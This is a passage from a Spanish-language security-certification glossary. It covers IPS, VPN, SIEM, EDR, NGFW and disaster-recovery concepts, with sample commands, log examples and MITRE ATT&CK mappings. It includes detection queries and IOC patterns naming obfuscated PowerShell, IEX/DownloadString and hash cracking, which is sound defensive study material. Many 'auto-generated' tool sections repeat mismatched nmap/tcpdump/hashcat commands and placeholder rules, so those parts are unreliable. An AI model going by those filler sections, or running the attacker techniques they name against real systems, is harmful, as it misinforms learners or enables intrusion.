    "category": "Attempted Administrator Privilege Gain",
    "severity": 1
  },
  "http": {
    "url": "/struts2-showcase/actionChain1.action",
    "http_method": "POST"
  }
}

→ IOC: Apache Struts exploit blocked, pero verificar logs: ¿atacante intentó múltiples endpoints antes?
```

#### 🎭 MITRE ATT&CK

**T1190 - Exploit Public-Facing Application**  
- Tactic: Initial Access  
- Relevance: IPS bloquea exploits conocidos en tiempo real  
- Detection: CVE-based rules, WAF-like protection  

**T1498 - Network Denial of Service**  
- Tactic: Impact  
- Relevance: IPS puede rate-limit DDoS  
- Detection: Connection rate thresholds, SYN flood protection  

**T1071.001 - Web Protocols**  
- Tactic: Command and Control  
- Relevance: IPS bloquea C2 communication a known bad IPs  
- Detection: Threat intel IP blacklists integrated  

---

### HIPS (Host-based Intrusion Prevention System)

**Definición:** IPS instalado en host individual. Monitorea y bloquea actividad maliciosa en sistema. Respuesta activa a amenazas locales

**Ejemplos:**
- Bloquea exploit en endpoint
- Monitoreo system calls
- Previene buffer overflow
- Complementa antivirus

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### NIPS (Network-based IPS)

**Definición:** Sistema de prevencion de intrusiones a nivel de red. Modo inline - puede bloquear trafico. Accion proactiva

**Ejemplos:**
- Snort en modo IPS
- Inline entre segmentos
- Bloquea ataques automaticamente
- Drop packets maliciosos

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con NIPS (Network-based IPS)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### VPN (Virtual Private Network)

**Definición:** Túnel cifrado sobre red pública. Conecta sitios remotos o usuarios de forma segura. Protocolos: IPSec, SSL/TLS, WireGuard

**Ejemplos:**
- Empleado remoto conecta a red corporativa
- Site-to-site VPN entre oficinas
- OpenVPN, WireGuard

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con VPN (Virtual Private Network)  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### Site-to-Site VPN

**Definición:** VPN que conecta dos redes completas. Tipicamente entre oficinas. Gateway VPN en cada lado. IPsec comun. Always-on

**Ejemplos:**
- Oficina central a sucursal
- IPsec site-to-site
- Router VPN endpoints
- Conecta LANs completas

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con Site-to-Site VPN  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### SASE (Secure Access Service Edge)

**Definición:** Framework Gartner. Red + seguridad en servicio cloud unico. SD-WAN + CASB + FWaaS + ZTNA + SWG. Cloud-native

**Ejemplos:**
- Gartner framework
- Convergencia red + seguridad
- Replace MPLS + VPN
- Cloud-delivered security
- Zero Trust Network Access

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con SASE (Secure Access Service Edge)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### SDN (Software-Defined Networking)

**Definición:** Red definida por software. Separa plano de control de plano de datos. Gestion centralizada via controlador. Programable y flexible

**Ejemplos:**
- OpenFlow protocol
- Controlador SDN centralizado
- Network automation
- Dynamic policy enforcement

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con SDN (Software-Defined Networking)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### VLAN (Virtual Local Area Network)

**Definición:** Segmentacion logica de red. Divide red fisica en multiples redes virtuales. Aislamiento de broadcast. Seguridad por segmentacion

**Ejemplos:**
- VLAN 10 = Contabilidad
- VLAN 20 = IT
- VLAN tagging 802.1Q
- Trunk port
- Access port

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con VLAN (Virtual Local Area Network)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### DMZ (Demilitarized Zone)

**Definición:** Segmento de red aislado entre Internet y red interna. Aloja servicios públicos (web, email) accesibles desde exterior

**Ejemplos:**
- Servidor web público en DMZ
- Firewall entre Internet-DMZ y DMZ-LAN

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con DMZ (Demilitarized Zone)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### ACL (Access Control List)

**Definición:** Lista de reglas de control de acceso. Filtra trafico por IP, puerto, protocolo. Implementada en routers, switches, firewalls

**Ejemplos:**
- Permit tcp 192.168.1.0/24 any eq 80
- Deny ip any any
- Router ACL
- Firewall rules
- Order matters

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con ACL (Access Control List)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### IEEE 802.1X

**Definición:** Estandar de control de acceso de red basado en puerto. Autenticacion antes de acceso a red. Usa EAP. Supplicant-Authenticator-Auth Server

**Ejemplos:**
- WPA2-Enterprise
- EAP-TLS autenticacion
- RADIUS backend
- Switch port authentication
- NAC enforcement

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con IEEE 802.1X  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### Proxy Server (Servidor Proxy)

**Definición:** Intermediario entre cliente e Internet. Filtra, cachea y anonimiza trafico. Forward o reverse proxy. Control y seguridad

**Ejemplos:**
- Squid proxy
- Web proxy
- Forward proxy (salida)
- Reverse proxy (entrada)
- Content filtering

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### RAS (Remote Access Service)

**Definición:** Servicio que proporciona acceso remoto seguro a red. VPN, dial-up, terminal services. Permite trabajo remoto

**Ejemplos:**
- Windows RAS
- VPN concentrator
- Remote Desktop Gateway
- Acceso remoto empleados

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con RAS (Remote Access Service)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### Air Gap (Entrehierro)

**Definición:** Aislamiento fisico completo de red. Sistema sin conexion a redes externas. Maxima seguridad por separacion fisica

**Ejemplos:**
- Sistema SCADA aislado
- Red clasificada militar
- Sistema critico sin Internet
- Transferencia via USB solo

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con Air Gap (Entrehierro)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### SIEM (Security Information and Event Management)

**Definición:** Plataforma centralizada que recopila, correlaciona y analiza logs de múltiples fuentes. Genera alertas de seguridad

**Ejemplos:**
- Splunk
- Elastic Security
- QRadar
- Correlación: 1000 login fallidos en 1 min = brute force

#### 🔧 Herramientas (Extension: manual)

**Splunk SPL:**  
- Propósito: Query para detectar brute force attacks  
- Comando: `index=windows EventCode=4625 | stats count by src_ip, user | where count > 10`  
- Output: Lista de IPs con >10 intentos fallidos de login  

**Microsoft Sentinel KQL:**  
- Propósito: Detectar accesos desde países inusuales  
- Comando: `SigninLogs | where Location !in ('US', 'ES') | summarize count() by UserPrincipalName, Location`  
- Output: Usuarios accediendo desde países no habituales  

**ELK Stack:**  
- Propósito: Correlación de eventos multi-fuente  
- Comando: `GET /logs-*/_search { "query": { "bool": { "must": [ { "match": { "event.code": "4625" } }, { "range": { "@timestamp": { "gte": "now-1h" } } } ] } } }`  
- Output: Failed logins última hora en formato JSON  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4624 (logon success), 4625 (logon failed), 4672 (special privileges), 4688 (process creation)
- Linux: /var/log/auth.log, /var/log/syslog, /var/log/audit/audit.log
- Firewall: Allow/Deny logs con src_ip, dst_ip, port, protocol
- Proxy: HTTP requests con user-agent, URL, response code
- DNS: Query logs para detectar C2 beaconing

**IOC Patterns:**
- Spike en Event ID 4625 desde misma IP (brute force)
- Event ID 4672 fuera de horario laboral (privileged access anómalo)
- Múltiples 4688 con proceso powershell.exe -enc (command obfuscation)
- DNS queries a dominios DGA (Domain Generation Algorithm)
- Beaconing: conexiones repetitivas cada X segundos a misma IP externa

**Ejemplo de log:**
```
EventID=4625 Time=2026-03-03 03:24:15 User=admin SrcIP=185.220.101.45 LogonType=3 Status=0xC000006D
EventID=4625 Time=2026-03-03 03:24:17 User=admin SrcIP=185.220.101.45 LogonType=3 Status=0xC000006D
[... 48 intentos más ...]
EventID=4624 Time=2026-03-03 03:31:42 User=admin SrcIP=185.220.101.45 LogonType=3
→ IOC: Brute force exitoso después de 50 intentos (password débil)
```

#### 🎭 MITRE ATT&CK

**T1056.001 - Keylogging**  
- Tactic: Collection  
- Relevance: SIEM debe detectar procesos de keyloggers conocidos  
- Detection: Monitor Sysmon Event ID 1 (process creation) para keylogger signatures  

**T1070.001 - Clear Windows Event Logs**  
- Tactic: Defense Evasion  
- Relevance: Atacantes borran logs para evitar detección  
- Detection: Event ID 1102 (audit log cleared), gaps en timeline de logs  

**T1021.002 - SMB/Windows Admin Shares**  
- Tactic: Lateral Movement  
- Relevance: Detectar movimiento lateral vía SMB  
- Detection: Event ID 5140 (network share accessed) desde IPs internas inusuales  

---

### EDR (Endpoint Detection and Response)

**Definición:** Solución que detecta amenazas en endpoints por comportamiento. Permite investigación forense y respuesta remota

**Ejemplos:**
- CrowdStrike Falcon
- SentinelOne
- Detección de ransomware por comportamiento anómalo

#### 🔧 Herramientas (Extension: manual)

**CrowdStrike Falcon:**  
- Propósito: Hunting para detectar persistence mechanisms  
- Comando: `event_simpleName=AsepValueUpdate OR event_simpleName=ScheduledTaskRegistered | table ComputerName, RegObjectName, TaskName`  
- Output: Muestra cambios en registry Run keys y scheduled tasks  

**Microsoft Defender ATP:**  
- Propósito: Detectar procesos sospechosos con PowerShell obfuscado  
- Comando: `DeviceProcessEvents | where ProcessCommandLine contains '-enc' or ProcessCommandLine contains 'IEX' | project Timestamp, DeviceName, ProcessCommandLine`  
- Output: Comandos PowerShell ofuscados ejecutados  

**Carbon Black:**  
- Propósito: Threat hunting para unsigned DLLs cargadas  
- Comando: `modload:*.dll -signed:true | group_by process_name`  
- Output: Procesos cargando DLLs sin firma digital  

#### 📊 Log Analysis

**Logs a revisar:**
- EDR agent logs: process creation, network connections, file modifications
- Sysmon Event ID 1 (process creation), 3 (network connection), 7 (image loaded), 11 (file created)
- Windows Event ID 4688 (process creation) con command line logging habilitado
- Registry changes: Sysmon Event ID 12, 13, 14 (registry events)
- Scheduled tasks: Event ID 4698 (scheduled task created)

**IOC Patterns:**
- Process con parent process anómalo: cmd.exe → parent: winword.exe (macro maliciosa)
- Network connection desde proceso inusual: rundll32.exe conectando a IP externa
- DLL injection: proceso legítimo cargando DLL desde %TEMP%
- Unsigned executable en C:\Users\Public (common malware dropper location)
- PowerShell con -EncodedCommand + conexión de red saliente (C2 beaconing)

**Ejemplo de log:**
```
Sysmon EventID=1 Time=2026-03-03 14:23:11
Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine=powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABzAD0ATgBlAHcAL...
ParentImage=C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
User=DOMAIN\jsmith
→ IOC: Word ejecutando PowerShell obfuscado (probable macro maliciosa)
```

#### 🎭 MITRE ATT&CK

**T1059.001 - PowerShell**  
- Tactic: Execution  
- Relevance: EDR debe detectar PowerShell con comandos ofuscados o sospechosos  
- Detection: Monitor process command line para -enc, IEX, Invoke-Expression, DownloadString  

**T1547.001 - Registry Run Keys**  
- Tactic: Persistence  
- Relevance: Malware crea entrada en HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  
- Detection: Sysmon Event ID 13 (RegistryEvent) en Run keys  

**T1055 - Process Injection**  
- Tactic: Defense Evasion  
- Relevance: Malware inyecta código en proceso legítimo para evadir detección  
- Detection: Sysmon Event ID 8 (CreateRemoteThread), 10 (ProcessAccess)  

---

### NGFW (Next-Generation Firewall)

**Definición:** Firewall avanzado con deep packet inspection, IPS, application awareness, threat intelligence integrada

**Ejemplos:**
- Palo Alto Networks
- Bloquear Facebook pero permitir LinkedIn
- Inspección SSL/TLS

#### 🔧 Herramientas (Extension: manual)

**Palo Alto CLI:**  
- Propósito: Query NGFW logs y threat prevention  
- Comando: `show log traffic direction equal backward | match 203.0.113`  
- Output: Traffic logs filtrados  

**FortiGate CLI:**  
- Propósito: Real-time threat monitoring  
- Comando: `diagnose debug flow show console enable && diagnose debug flow filter addr 10.0.1.100`  
- Output: Live traffic debug  

**Firepower CLI:**  
- Propósito: Intrusion events query  
- Comando: `system support intrusion-event-query`  
- Output: IPS events  

#### 📊 Log Analysis

**Logs a revisar:**
- Traffic logs: src, dst, app-id, action (allow/deny/drop)
- Threat logs: virus/spyware/vulnerability/url-filtering
- URL filtering logs: categories blocked, user attribution
- Application logs: app-id (ej: facebook-base, bittorrent)
- User-ID logs: user-to-IP mapping, authentication events

**IOC Patterns:**
- C2 communication: app-id unknown-tcp con destination sospechosa
- Malware download: threat-name con action=alert/block
- Cryptomining: high CPU usage + outbound to pool.minergate.com
- Data exfiltration: large uploads vía non-business apps
- Tunneling: app-id=ssh-tunnel o dns-tunnel

**Ejemplo de log:**
```
Time: 2026-03-03 15:42:11
Source: 10.0.50.45
Destination: 185.220.101.23:443
Application: ssl
App-Category: encrypted-tunnel
Action: deny
Rule: Block-Tunneling
Threat-Name: Generic.Tunnel.DNS
User: jsmith@company.com

→ IOC: Usuario intentando usar DNS tunneling para exfil, bloqueado por NGFW
```

#### 🎭 MITRE ATT&CK

**T1071.004 - DNS**  
- Tactic: Command and Control  
- Relevance: NGFW detecta DNS tunneling con DPI  
- Detection: App-ID DNS anomalies, long queries, high frequency  

**T1048.003 - Exfiltration Over Unencrypted Channel**  
- Tactic: Exfiltration  
- Relevance: NGFW inspecciona traffic por app-id  
- Detection: DLP features, large upload detection  

**T1090.003 - Multi-hop Proxy**  
- Tactic: Defense Evasion  
- Relevance: NGFW detecta proxy/VPN tunnels  
- Detection: App-ID: ssl-tunnel, ssh-tunnel, tor  

---

### DLP (Data Loss Prevention)

**Definición:** Sistema que detecta y previene exfiltración/fuga de datos sensibles. Monitoriza datos en reposo, uso y tránsito

**Ejemplos:**
- Bloquear email con números de tarjetas
- Alertar si copian PII a USB
- Detectar subida de datos confidenciales a cloud

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### RTO (Recovery Time Objective)

**Definición:** Tiempo máximo aceptable de inactividad de un sistema tras un desastre. Cuánto tiempo puede estar caído

**Ejemplos:**
- RTO de 4 horas para sistema crítico
- Si RTO = 1 hora → necesitas hot site

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### RPO (Recovery Point Objective)

**Definición:** Cantidad máxima aceptable de pérdida de datos medida en tiempo. Cuánto dato puedes perder

**Ejemplos:**
- RPO de 1 hora = backups cada hora máximo
- RPO = 0 → replicación síncrona en tiempo real

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Regla 3-2-1 de Backup

**Definición:** 3 copias de datos, en 2 tipos de medios diferentes, 1 copia offsite (fuera del sitio)

**Ejemplos:**
- Original + backup en NAS + backup en nube
- Protección contra ransomware y desastres físicos

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Snapshot (Instantanea)

**Definición:** Captura punto-en-tiempo de VM o volumen. Estado completo en momento especifico. Rollback rapido. NO es backup completo a largo plazo

**Ejemplos:**
- VMware snapshot antes de update
- AWS EBS snapshot
- Rollback en minutos
- No reemplaza backups

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Replication (Replicacion)

**Definición:** Copia continua de datos a ubicacion secundaria. Sincrona (RPO=0) o asincrona (RPO>0). Alta disponibilidad y DR

**Ejemplos:**
- Database replication
- Storage replication
- Active-Passive replica
- Replicacion sincrona cara pero RPO=0

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Load Balancing

**Definición:** Distribución de carga de trabajo entre múltiples servidores para mejorar rendimiento y disponibilidad

**Ejemplos:**
- HAProxy
- F5 BigIP
- Round-robin, least connections
- Distribución de tráfico web entre servidores

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Hot Site

**Definición:** Centro de datos de backup completamente operacional con replicación en tiempo real. RTO/RPO mínimos (minutos). MUY costoso

**Ejemplos:**
- Failover automático en minutos
- Sistema crítico 24/7
- Replicación síncrona de datos

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Warm Site (Sitio Calido)

**Definición:** Sitio DR con infraestructura basica. Equipos instalados pero no completamente configurados. RTO medio (horas/dias). Balance costo/tiempo

**Ejemplos:**
- Servidores listos, datos desactualizados
- RTO 12-24 horas
- Requiere restore reciente
- Costo medio DR

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Cold Site (Sitio Frio)

**Definición:** Sitio DR solo con espacio fisico y servicios basicos. Sin equipos preinstalados. RTO largo (dias/semanas). Opcion mas economica

**Ejemplos:**
- Solo edificio + electricidad + Internet
- RTO > 1 semana
- Envio e instalacion equipos necesario
- Minimo costo

#### 🔧 Herramientas (Extension: auto-generated)

**Compliance scanner:**  
- Propósito: Verificar cumplimiento de Cold Site (Sitio Frio)  
- Comando: `nessus/openscap scan`  
- Output: Reporte de compliance  

**Audit logs:**  
- Propósito: Evidencia para auditorías  
- Comando: `Export logs para auditor`  
- Output: Logs estructurados  

#### 📊 Log Analysis

**Logs a revisar:**
- Audit logs: cambios en configuración de seguridad
- Access logs: quién accedió a datos sensibles
- Change management logs: tickets y aprobaciones

---

### UPS (Uninterruptible Power Supply)

**Definición:** Sistema de alimentación ininterrumpida. Batería que proporciona energía temporal durante corte eléctrico

**Ejemplos:**
- UPS de 10 min para apagado seguro
- UPS enterprise para mantener datacenter hasta generador arranca

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### IaaS (Infrastructure as a Service)

**Definición:** Modelo cloud que proporciona infraestructura virtualizada. Usuario gestiona OS, aplicaciones. Proveedor gestiona hardware

**Ejemplos:**
- AWS EC2
- Azure Virtual Machines
- Google Compute Engine

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### SaaS (Software as a Service)

**Definición:** Aplicación completa en cloud. Usuario solo consume el servicio. Proveedor gestiona todo

**Ejemplos:**
- Office 365
- Salesforce
- Gmail
- Dropbox

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Screened Subnet (DMZ)

**Definición:** Subred ligeramente protegida entre Internet y red interna. Servidores publicos en DMZ. Doble firewall tipico. Buffer zone de seguridad

**Ejemplos:**
- Web servers en DMZ
- Email relay en DMZ
- Firewall Internet-DMZ-LAN
- Dual firewall architecture

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con Screened Subnet (DMZ)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### Implicit Deny (Firewall)

**Definición:** Regla por defecto: denegar todo trafico no explicitamente permitido. Ultima regla implicita en ACLs

**Ejemplos:**
- ACL: permit tcp any any eq 443; permit tcp any any eq 80; [implicit deny all]
- Principio de minimo privilegio en firewalls

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### URL Scanning

**Definición:** Analisis de URLs en tiempo real para detectar phishing, malware, sitios maliciosos. Reputacion de dominios

**Ejemplos:**
- Bloquear URLs de phishing
- Categorizar sitios web (social media, gambling)
- Servicios: Google Safe Browsing, VirusTotal

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a URL Scanning  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a URL Scanning
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con URL Scanning  
- Detection: Monitoreo de logs + behavioral analysis  

---

### DNS Filtering

**Definición:** Bloquear resoluciones DNS de dominios maliciosos. Previene acceso a phishing, malware, C&C. Nivel de red

**Ejemplos:**
- Cisco Umbrella
- Quad9 (9.9.9.9)
- Bloquear malware.com devolviendo NXDOMAIN o IP de bloqueo

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a DNS Filtering  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a DNS Filtering
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con DNS Filtering  
- Detection: Monitoreo de logs + behavioral analysis  

---

### Group Policy (GPO)

**Definición:** Configuracion centralizada en Active Directory para controlar usuarios/computadoras Windows. Politicas de seguridad, software, scripts

**Ejemplos:**
- Politica de contraseñas para dominio
- Desplegar software via GPO
- Configurar firewall de Windows
- Deshabilitar USB

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### FIM (File Integrity Monitoring)

**Definición:** Monitoreo de cambios en archivos criticos. Detecta modificaciones no autorizadas. Hash baseline + comparacion. Alerta cambios sospechosos

**Ejemplos:**
- Tripwire
- OSSEC FIM
- Detecta cambio en /etc/passwd
- PCI DSS requirement 11.5
- Hash comparison

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con FIM (File Integrity Monitoring)  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### MAC (Mandatory Access Control)

**Definición:** Control de acceso basado en clasificacion de seguridad. Sistema operativo impone politicas. Usuario NO puede modificar permisos

**Ejemplos:**
- SELinux
- AppArmor
- Etiquetas: Top Secret, Secret, Confidential, Unclassified
- Usado en entornos militares/gubernamentales

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### PEAP (Protected EAP)

**Definición:** Protocolo de autenticacion 802.1X. Crea tunel TLS antes de autenticar. Protege credenciales. EAP dentro de TLS

**Ejemplos:**
- PEAP-MSCHAPv2 (Windows)
- WPA2-Enterprise
- RADIUS + PEAP
- Certificado servidor RADIUS
- Tunel TLS cifrado

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con PEAP (Protected EAP)  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### EAP-TLS

**Definición:** EAP Transport Layer Security. Metodo mas seguro 802.1X. Requiere certificados en cliente Y servidor. Mutual authentication

**Ejemplos:**
- WPA2-Enterprise mas seguro
- Certificado digital cliente
- PKI requerida
- No transmite contraseñas

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### WPA Enterprise

**Definición:** WPA/WPA2/WPA3 con autenticacion 802.1X. Servidor RADIUS. Credenciales individuales por usuario. Para empresas

**Ejemplos:**
- RADIUS server
- EAP-TLS
- PEAP-MSCHAPv2
- Credenciales AD
- Mas seguro que PSK

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con WPA Enterprise  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### DAC (Discretionary Access Control)

**Definición:** Control de acceso discrecional. Propietario del recurso decide permisos. Usuarios pueden compartir recursos. Menos restrictivo

**Ejemplos:**
- Permisos NTFS en Windows
- chmod en Linux
- Usuario puede dar permisos a otros
- ACL definidas por owner

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Least Privilege

**Definición:** Principio de minimo privilegio. Usuarios/procesos solo acceso necesario para tarea. Reduce superficie de ataque. Best practice seguridad

**Ejemplos:**
- Usuario sin admin rights
- Cuenta servicio limitada
- Just-in-time admin access
- Reduce impacto de compromiso

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Least Privilege  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Least Privilege
- Anomalías en logs de aplicación/sistema
